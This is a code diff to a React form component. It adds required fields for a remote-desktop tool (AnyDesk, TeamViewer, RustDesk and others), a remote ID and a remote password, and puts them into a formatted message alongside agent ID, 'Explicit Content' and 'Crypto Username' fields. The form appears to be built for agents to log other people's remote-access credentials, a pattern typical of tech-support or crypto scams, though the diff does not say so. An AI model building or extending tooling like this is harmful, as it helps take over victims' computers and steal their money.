@@ -40,6 +40,9 @@ export default function Home() {
     agentId: '',
     agentName: '',
     alternatePhone: '',
+    remoteSoftware: '',
+    remoteId: '',
+    remotePassword: '',
     explicitContent: '',
     cryptoUsername: '',
   })
@@ -153,6 +156,9 @@ export default function Home() {
       formData.agentId.trim() !== '' &&
       formData.agentName.trim() !== '' &&
       formData.alternatePhone.trim() !== '' &&
+      formData.remoteSoftware.trim() !== '' &&
+      formData.remoteId.trim() !== '' &&
+      formData.remotePassword.trim() !== '' &&
       formData.explicitContent !== '' &&
       formData.cryptoUsername.trim() !== ''
     )
@@ -169,6 +175,9 @@ export default function Home() {
 *Agent ID:* ${data.agentId || 'N/A'}
 *Agent Name:* ${data.agentName || 'N/A'}
 *Alternate Phone:* ${data.alternatePhone || 'N/A'}
+*Remote Software:* ${data.remoteSoftware || 'N/A'}
+*Remote ID:* ${data.remoteId || 'N/A'}
+*Remote Password:* ${data.remotePassword || 'N/A'}
 *Explicit Content:* ${data.explicitContent || 'N/A'}
 *Crypto Username:* ${data.cryptoUsername || 'N/A'}
 
@@ -402,6 +411,50 @@ export default function Home() {
                   name="alternatePhone"
                   className="form-input"
                   value={formData.alternatePhone}
+                  onChange={handleInputChange}
+                  autoComplete="off"
+                />
+              </div>
+
+              <div className="form-group">
+                <label className="form-label">Remote Software</label>
+                <select
+                  name="remoteSoftware"
+                  className="form-select"
+                  value={formData.remoteSoftware}
+                  onChange={handleInputChange}
+                  autoComplete="off"
+                >
+                  <option value="">Please select remote software...</option>
+                  <option value="AnyDesk">AnyDesk</option>
+                  <option value="TeamViewer">TeamViewer</option>
+                  <option value="UltraViewer">UltraViewer</option>
+                  <option value="Chrome Remote Desktop">Chrome Remote Desktop</option>
+                  <option value="AnyViewer">AnyViewer</option>
+                  <option value="RustDesk">RustDesk</option>
+                  <option value="Other">Other</option>
+                </select>
+              </div>
+
+              <div className="form-group">
+                <label className="form-label">Remote ID</label>
+                <input
+                  type="text"
+                  name="remoteId"
+                  className="form-input"
+                  value={formData.remoteId}
+                  onChange={handleInputChange}
+                  autoComplete="off"
+                />
+              </div>
+
+              <div className="form-group">
+                <label className="form-label">Remote Password</label>
+                <input
+                  type="text"
+                  name="remotePassword"
+                  className="form-input"
+                  value={formData.remotePassword}
                   onChange={handleInputChange}
                   autoComplete="off"
                 />
